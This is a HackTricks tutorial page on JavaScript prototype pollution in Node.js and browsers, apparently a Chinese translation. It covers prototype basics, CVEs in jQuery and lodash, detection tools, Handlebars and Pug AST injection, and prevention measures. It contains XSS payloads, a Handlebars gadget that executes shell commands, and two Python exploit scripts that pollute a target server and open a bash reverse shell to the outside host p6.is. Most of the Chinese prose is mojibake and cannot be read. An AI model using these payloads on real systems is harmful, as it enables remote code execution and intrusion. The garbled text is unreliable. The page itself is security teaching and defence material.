# NodeJS - \_\_proto\_\_ & prototype Pollution

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## JavaScript ä¸­çš„å¯¹è±¡ <a href="#id-053a" id="id-053a"></a>

JavaScript ä¸­çš„å¯¹è±¡æœ¬è´¨ä¸Šæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œç§°ä¸ºå±æ€§ã€‚å¯ä»¥ä½¿ç”¨ `Object.create` å¹¶å°† `null` ä½œä¸ºå‚æ•°æ¥åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡ã€‚æ­¤æ–¹æ³•å…è®¸åˆ›å»ºæ²¡æœ‰ä»»ä½•ç»§æ‰¿å±æ€§çš„å¯¹è±¡ã€‚
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
ä¸€ä¸ªç©ºå¯¹è±¡ç±»ä¼¼äºä¸€ä¸ªç©ºå­—å…¸ï¼Œè¡¨ç¤ºä¸º`{}`ã€‚

### JavaScriptä¸­çš„å‡½æ•°å’Œç±»

åœ¨JavaScriptä¸­ï¼Œç±»å’Œå‡½æ•°å¯†åˆ‡ç›¸å…³ï¼Œå‡½æ•°é€šå¸¸ä½œä¸ºç±»çš„æ„é€ å‡½æ•°ã€‚å°½ç®¡JavaScriptç¼ºä¹åŸç”Ÿç±»æ”¯æŒï¼Œä½†æ„é€ å‡½æ•°å¯ä»¥æ¨¡æ‹Ÿç±»çš„è¡Œä¸ºã€‚
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypes in JavaScript

JavaScript å…è®¸åœ¨è¿è¡Œæ—¶ä¿®æ”¹ã€æ·»åŠ æˆ–åˆ é™¤åŸå‹å±æ€§ã€‚è¿™ç§çµæ´»æ€§ä½¿å¾—ç±»åŠŸèƒ½çš„åŠ¨æ€æ‰©å±•æˆä¸ºå¯èƒ½ã€‚

åƒ `toString` å’Œ `valueOf` è¿™æ ·çš„å‡½æ•°å¯ä»¥è¢«æ”¹å˜ä»¥æ”¹å˜å®ƒä»¬çš„è¡Œä¸ºï¼Œå±•ç¤ºäº† JavaScript åŸå‹ç³»ç»Ÿçš„é€‚åº”æ€§ã€‚

## Inheritance

åœ¨åŸºäºåŸå‹çš„ç¼–ç¨‹ä¸­ï¼Œå±æ€§/æ–¹æ³•ç”±å¯¹è±¡ä»ç±»ä¸­ç»§æ‰¿ã€‚è¿™äº›ç±»æ˜¯é€šè¿‡å°†å±æ€§/æ–¹æ³•æ·»åŠ åˆ°å¦ä¸€ä¸ªç±»çš„å®ä¾‹æˆ–ä¸€ä¸ªç©ºå¯¹è±¡æ¥åˆ›å»ºçš„ã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ä¸€ä¸ªå±æ€§è¢«æ·»åŠ åˆ°ä½œä¸ºå…¶ä»–å¯¹è±¡åŸå‹çš„å¯¹è±¡ï¼ˆä¾‹å¦‚ `myPersonObj`ï¼‰æ—¶ï¼Œç»§æ‰¿çš„å¯¹è±¡å¯ä»¥è®¿é—®è¿™ä¸ªæ–°å±æ€§ã€‚ç„¶è€Œï¼Œé™¤éæ˜ç¡®è°ƒç”¨ï¼Œå¦åˆ™è¿™ä¸ªå±æ€§ä¸ä¼šè‡ªåŠ¨æ˜¾ç¤ºã€‚

## \_\_proto\_\_ pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Exploring Prototype Pollution in JavaScript

JavaScript å¯¹è±¡ç”±é”®å€¼å¯¹å®šä¹‰ï¼Œå¹¶ä» JavaScript å¯¹è±¡åŸå‹ç»§æ‰¿ã€‚è¿™æ„å‘³ç€æ”¹å˜å¯¹è±¡åŸå‹å¯ä»¥å½±å“ç¯å¢ƒä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚

è®©æˆ‘ä»¬ç”¨ä¸€ä¸ªä¸åŒçš„ä¾‹å­æ¥è¯´æ˜ï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
é€šè¿‡ä»¥ä¸‹æ–¹å¼å¯ä»¥è®¿é—® Object åŸå‹ï¼š
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
é€šè¿‡å‘ Object åŸå‹æ·»åŠ å±æ€§ï¼Œæ¯ä¸ª JavaScript å¯¹è±¡å°†ç»§æ‰¿è¿™äº›æ–°å±æ€§ï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototype pollution

å¯¹äºé™åˆ¶ä½¿ç”¨ `__proto__` çš„åœºæ™¯ï¼Œä¿®æ”¹å‡½æ•°çš„åŸå‹æ˜¯ä¸€ä¸ªæ›¿ä»£æ–¹æ¡ˆï¼š
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
è¿™ä»…å½±å“ä» `Vehicle` æ„é€ å‡½æ•°åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿å®ƒä»¬å…·æœ‰ `beep`ã€`hasWheels`ã€`honk` å’Œ `isElectric` å±æ€§ã€‚

é€šè¿‡åŸå‹æ±¡æŸ“å…¨å±€å½±å“ JavaScript å¯¹è±¡çš„ä¸¤ç§æ–¹æ³•åŒ…æ‹¬ï¼š

1. ç›´æ¥æ±¡æŸ“ `Object.prototype`ï¼š
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. æ±¡æŸ“å¸¸ç”¨ç»“æ„çš„æ„é€ å‡½æ•°åŸå‹ï¼š
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
åœ¨è¿™äº›æ“ä½œä¹‹åï¼Œæ¯ä¸ª JavaScript å¯¹è±¡éƒ½å¯ä»¥æ‰§è¡Œ `goodbye` å’Œ `greet` æ–¹æ³•ã€‚

## æ±¡æŸ“å…¶ä»–å¯¹è±¡

### ä»ç±»åˆ° Object.prototype

åœ¨ä¸€ä¸ªå¯ä»¥ **æ±¡æŸ“ç‰¹å®šå¯¹è±¡** çš„åœºæ™¯ä¸­ï¼Œå¦‚æœä½ éœ€è¦ **åˆ°è¾¾ `Object.prototype`**ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç è¿›è¡Œæœç´¢ï¼š
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### æ•°ç»„å…ƒç´ æ±¡æŸ“

æ³¨æ„ï¼Œç”±äºæ‚¨å¯ä»¥æ±¡æŸ“ JS ä¸­å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœæ‚¨æœ‰æƒæ±¡æŸ“æ•°ç»„ï¼Œæ‚¨ä¹Ÿå¯ä»¥é€šè¿‡ç´¢å¼•**æ±¡æŸ“æ•°ç»„çš„å€¼**ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨ä¸èƒ½è¦†ç›–å€¼ï¼Œå› æ­¤æ‚¨éœ€è¦æ±¡æŸ“ä»¥æŸç§æ–¹å¼ä½¿ç”¨ä½†æœªè¢«å†™å…¥çš„ç´¢å¼•ï¼‰ã€‚
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elements pollution

é€šè¿‡ JS ç”Ÿæˆ HTML å…ƒç´ æ—¶ï¼Œå¯ä»¥ **è¦†ç›–** **`innerHTML`** å±æ€§ï¼Œä½¿å…¶å†™å…¥ **ä»»æ„ HTML ä»£ç ã€‚** [è¿™ä¸ªå†™ä½œçš„æƒ³æ³•å’Œç¤ºä¾‹](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## ç¤ºä¾‹

### åŸºæœ¬ç¤ºä¾‹

åŸå‹æ±¡æŸ“æ˜¯ç”±äºåº”ç”¨ç¨‹åºä¸­çš„ç¼ºé™·å¯¼è‡´çš„ï¼Œè¯¥ç¼ºé™·å…è®¸è¦†ç›– `Object.prototype` ä¸Šçš„å±æ€§ã€‚è¿™æ„å‘³ç€å¤§å¤šæ•°å¯¹è±¡ä» `Object.prototype` æ´¾ç”Ÿå…¶å±æ€§ã€‚

æœ€ç®€å•çš„ç¤ºä¾‹æ˜¯å‘ä¸€ä¸ª**æœªå®šä¹‰å±æ€§çš„å¯¹è±¡**æ·»åŠ ä¸€ä¸ªå€¼ï¼Œè¯¥å¯¹è±¡å°†è¢«æ£€æŸ¥ï¼Œä¾‹å¦‚ï¼š
```javascript
if (user.admin) {
```
å¦‚æœå±æ€§ **`admin` æœªå®šä¹‰**ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ PP å¹¶å°†å…¶è®¾ç½®ä¸º Trueï¼Œä¾‹å¦‚ï¼š
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
è¯¥æœºåˆ¶æ¶‰åŠæ“çºµå±æ€§ï¼Œä»¥ä¾¿å¦‚æœæ”»å‡»è€…æ§åˆ¶æŸäº›è¾“å…¥ï¼Œä»–ä»¬å¯ä»¥ä¿®æ”¹åº”ç”¨ç¨‹åºä¸­æ‰€æœ‰å¯¹è±¡çš„åŸå‹ã€‚è¿™ç§æ“çºµé€šå¸¸æ¶‰åŠè®¾ç½® `__proto__` å±æ€§ï¼Œåœ¨ JavaScript ä¸­ï¼Œè¿™ä¸ç›´æ¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹åŒä¹‰ã€‚

æˆåŠŸæ‰§è¡Œæ­¤æ”»å‡»çš„æ¡ä»¶ï¼Œå¦‚ç‰¹å®š [ç ”ç©¶](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) ä¸­æ‰€è¿°ï¼ŒåŒ…æ‹¬ï¼š

* æ‰§è¡Œé€’å½’åˆå¹¶ã€‚
* æ ¹æ®è·¯å¾„å®šä¹‰å±æ€§ã€‚
* å…‹éš†å¯¹è±¡ã€‚

### Override function
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution to RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

å…¶ä»–æœ‰æ•ˆè½½è·ï¼š

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Client-side prototype pollution to XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: é€šè¿‡ jQuery $ .extend çš„åŸå‹æ±¡æŸ“æ”»å‡»

[æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) åœ¨ jQuery ä¸­ï¼Œ`$ .extend` å‡½æ•°å¦‚æœæ·±æ‹·è´åŠŸèƒ½ä½¿ç”¨ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´åŸå‹æ±¡æŸ“ã€‚æ­¤å‡½æ•°é€šå¸¸ç”¨äºå…‹éš†å¯¹è±¡æˆ–åˆå¹¶é»˜è®¤å¯¹è±¡çš„å±æ€§ã€‚ç„¶è€Œï¼Œå½“é…ç½®é”™è¯¯æ—¶ï¼ŒåŸæœ¬ç”¨äºæ–°å¯¹è±¡çš„å±æ€§å¯èƒ½ä¼šè¢«åˆ†é…ç»™åŸå‹ã€‚ä¾‹å¦‚ï¼š
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
æ­¤æ¼æ´è¢«è¯†åˆ«ä¸º CVE-2019â€“11358ï¼Œè¯´æ˜æ·±æ‹·è´å¦‚ä½•æ— æ„ä¸­ä¿®æ”¹åŸå‹ï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œä¾‹å¦‚å¦‚æœåƒ `isAdmin` è¿™æ ·çš„å±æ€§åœ¨æ²¡æœ‰é€‚å½“å­˜åœ¨éªŒè¯çš„æƒ…å†µä¸‹è¢«æ£€æŸ¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœªç»æˆæƒçš„ç®¡ç†å‘˜è®¿é—®ã€‚

### CVE-2018â€“3721, CVE-2019â€“10744: é€šè¿‡ lodash çš„åŸå‹æ±¡æŸ“æ”»å‡»

[æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æœ¬æ–‡](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) é‡åˆ°äº†ç±»ä¼¼çš„åŸå‹æ±¡æŸ“æ¼æ´ (CVE-2018â€“3721, CVE-2019â€“10744)ã€‚è¿™äº›é—®é¢˜åœ¨ç‰ˆæœ¬ 4.17.11 ä¸­å¾—åˆ°äº†ä¿®å¤ã€‚

### å¦ä¸€ä¸ªåŒ…å« CVE çš„æ•™ç¨‹

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### æ£€æµ‹åŸå‹æ±¡æŸ“çš„å·¥å…·

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Burp Suite æ‰©å±•ï¼Œæ—¨åœ¨æ£€æµ‹å’Œåˆ†æ Web åº”ç”¨ç¨‹åºä¸­çš„æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“æ¼æ´ã€‚è¯¥å·¥å…·è‡ªåŠ¨åŒ–æ‰«æè¯·æ±‚çš„è¿‡ç¨‹ï¼Œä»¥è¯†åˆ«æ½œåœ¨çš„åŸå‹æ±¡æŸ“é—®é¢˜ã€‚å®ƒåˆ©ç”¨å·²çŸ¥çš„å·¥å…· - åˆ©ç”¨åŸå‹æ±¡æŸ“æ‰§è¡Œæœ‰å®³æ“ä½œçš„æ–¹æ³• - ç‰¹åˆ«å…³æ³¨ Node.js åº“ã€‚
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): æ­¤æ‰©å±•è¯†åˆ«æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“æ¼æ´ã€‚å®ƒä½¿ç”¨åœ¨ [server side prototype pollution](https://portswigger.net/research/server-side-prototype-pollution) ä¸­æè¿°çš„æŠ€æœ¯ã€‚

### NodeJS ä¸­çš„ AST åŸå‹æ±¡æŸ“

NodeJS åœ¨ JavaScript ä¸­å¹¿æ³›ä½¿ç”¨æŠ½è±¡è¯­æ³•æ ‘ (AST) è¿›è¡Œæ¨¡æ¿å¼•æ“å’Œ TypeScript ç­‰åŠŸèƒ½ã€‚æœ¬èŠ‚æ¢è®¨ä¸æ¨¡æ¿å¼•æ“ï¼ˆç‰¹åˆ«æ˜¯ Handlebars å’Œ Pugï¼‰ä¸­çš„åŸå‹æ±¡æŸ“ç›¸å…³çš„æ¼æ´ã€‚

#### Handlebars æ¼æ´åˆ†æ

Handlebars æ¨¡æ¿å¼•æ“æ˜“å—åŸå‹æ±¡æŸ“æ”»å‡»ã€‚æ­¤æ¼æ´æºäº `javascript-compiler.js` æ–‡ä»¶ä¸­çš„ç‰¹å®šå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œ`appendContent` å‡½æ•°åœ¨å­˜åœ¨æ—¶ä¼šè¿æ¥ `pendingContent`ï¼Œè€Œ `pushSource` å‡½æ•°åœ¨æ·»åŠ æºåä¼šå°† `pendingContent` é‡ç½®ä¸º `undefined`ã€‚

**åˆ©ç”¨è¿‡ç¨‹**

åˆ©ç”¨è¿‡ç¨‹åˆ©ç”¨ Handlebars ç”Ÿæˆçš„ ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰ï¼Œéµå¾ªä»¥ä¸‹æ­¥éª¤ï¼š

1. **è§£æå™¨çš„æ“æ§**ï¼šæœ€åˆï¼Œè§£æå™¨é€šè¿‡ `NumberLiteral` èŠ‚ç‚¹å¼ºåˆ¶å€¼ä¸ºæ•°å­—ã€‚åŸå‹æ±¡æŸ“å¯ä»¥è§„é¿æ­¤é™åˆ¶ï¼Œä»è€Œå…è®¸æ’å…¥éæ•°å­—å­—ç¬¦ä¸²ã€‚
2. **ç¼–è¯‘å™¨çš„å¤„ç†**ï¼šç¼–è¯‘å™¨å¯ä»¥å¤„ç† AST å¯¹è±¡æˆ–å­—ç¬¦ä¸²æ¨¡æ¿ã€‚å¦‚æœ `input.type` ç­‰äº `Program`ï¼Œåˆ™è¾“å…¥è¢«è§†ä¸ºé¢„è§£æï¼Œè¿™å¯ä»¥è¢«åˆ©ç”¨ã€‚
3. **ä»£ç æ³¨å…¥**ï¼šé€šè¿‡æ“æ§ `Object.prototype`ï¼Œå¯ä»¥å°†ä»»æ„ä»£ç æ³¨å…¥æ¨¡æ¿å‡½æ•°ï¼Œè¿™å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

ä¸€ä¸ªæ¼”ç¤º Handlebars æ¼æ´åˆ©ç”¨çš„ç¤ºä¾‹ï¼š
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
è¿™æ®µä»£ç å±•ç¤ºäº†æ”»å‡»è€…å¦‚ä½•å°†ä»»æ„ä»£ç æ³¨å…¥åˆ° Handlebars æ¨¡æ¿ä¸­ã€‚

**å¤–éƒ¨å‚è€ƒ**ï¼šåœ¨ 'flat' åº“ä¸­å‘ç°äº†ä¸åŸå‹æ±¡æŸ“ç›¸å…³çš„é—®é¢˜ï¼Œè¯¦ç»†ä¿¡æ¯è§æ­¤å¤„ï¼š[GitHub é—®é¢˜](https://github.com/hughsk/flat/issues/105)ã€‚

**å¤–éƒ¨å‚è€ƒ**ï¼š[ä¸ 'flat' åº“ä¸­çš„åŸå‹æ±¡æŸ“ç›¸å…³çš„é—®é¢˜](https://github.com/hughsk/flat/issues/105)

Python ä¸­åŸå‹æ±¡æŸ“åˆ©ç”¨çš„ç¤ºä¾‹ï¼š
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug æ¼æ´

Pugï¼Œå¦ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œé¢ä¸´ç€ç±»ä¼¼çš„åŸå‹æ±¡æŸ“é£é™©ã€‚è¯¦ç»†ä¿¡æ¯å¯åœ¨å…³äº [Pug ä¸­çš„ AST æ³¨å…¥](https://blog.p6.is/AST-Injection/#Pug) çš„è®¨è®ºä¸­æ‰¾åˆ°ã€‚

Pug ä¸­åŸå‹æ±¡æŸ“çš„ç¤ºä¾‹ï¼š
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### é¢„é˜²æªæ–½

ä¸ºäº†é™ä½åŸå‹æ±¡æŸ“çš„é£é™©ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ç­–ç•¥ï¼š

1. **å¯¹è±¡ä¸å¯å˜æ€§**ï¼šå¯ä»¥é€šè¿‡åº”ç”¨ `Object.freeze` ä½¿ `Object.prototype` å˜ä¸ºä¸å¯å˜ã€‚
2. **è¾“å…¥éªŒè¯**ï¼šJSON è¾“å…¥åº”ä¸¥æ ¼æ ¹æ®åº”ç”¨ç¨‹åºçš„æ¶æ„è¿›è¡ŒéªŒè¯ã€‚
3. **å®‰å…¨åˆå¹¶å‡½æ•°**ï¼šåº”é¿å…ä¸å®‰å…¨çš„é€’å½’åˆå¹¶å‡½æ•°ä½¿ç”¨ã€‚
4. **æ— åŸå‹å¯¹è±¡**ï¼šå¯ä»¥ä½¿ç”¨ `Object.create(null)` åˆ›å»ºæ²¡æœ‰åŸå‹å±æ€§çš„å¯¹è±¡ã€‚
5. **ä½¿ç”¨ Map**ï¼šåº”ä½¿ç”¨ `Map` æ¥å­˜å‚¨é”®å€¼å¯¹ï¼Œè€Œä¸æ˜¯ `Object`ã€‚
6. **åº“æ›´æ–°**ï¼šé€šè¿‡å®šæœŸæ›´æ–°åº“æ¥çº³å…¥å®‰å…¨è¡¥ä¸ã€‚
7. **Linter å’Œé™æ€åˆ†æå·¥å…·**ï¼šä½¿ç”¨åƒ ESLint è¿™æ ·çš„å·¥å…·åŠé€‚å½“çš„æ’ä»¶æ¥æ£€æµ‹å’Œé˜²æ­¢åŸå‹æ±¡æŸ“æ¼æ´ã€‚
8. **ä»£ç å®¡æŸ¥**ï¼šå®æ–½å½»åº•çš„ä»£ç å®¡æŸ¥ï¼Œä»¥è¯†åˆ«å’Œä¿®å¤ä¸åŸå‹æ±¡æŸ“ç›¸å…³çš„æ½œåœ¨é£é™©ã€‚
9. **å®‰å…¨åŸ¹è®­**ï¼šæ•™è‚²å¼€å‘äººå‘˜æœ‰å…³åŸå‹æ±¡æŸ“çš„é£é™©å’Œç¼–å†™å®‰å…¨ä»£ç çš„æœ€ä½³å®è·µã€‚
10. **è°¨æ…ä½¿ç”¨åº“**ï¼šåœ¨ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“æ—¶è¦è°¨æ…ã€‚è¯„ä¼°å…¶å®‰å…¨æ€åŠ¿å¹¶å®¡æŸ¥å…¶ä»£ç ï¼Œç‰¹åˆ«æ˜¯é‚£äº›æ“ä½œå¯¹è±¡çš„åº“ã€‚
11. **è¿è¡Œæ—¶ä¿æŠ¤**ï¼šé‡‡ç”¨è¿è¡Œæ—¶ä¿æŠ¤æœºåˆ¶ï¼Œä¾‹å¦‚ä½¿ç”¨å®‰å…¨å¯¼å‘çš„ npm åŒ…ï¼Œè¿™äº›åŒ…å¯ä»¥æ£€æµ‹å’Œé˜²æ­¢åŸå‹æ±¡æŸ“æ”»å‡»ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
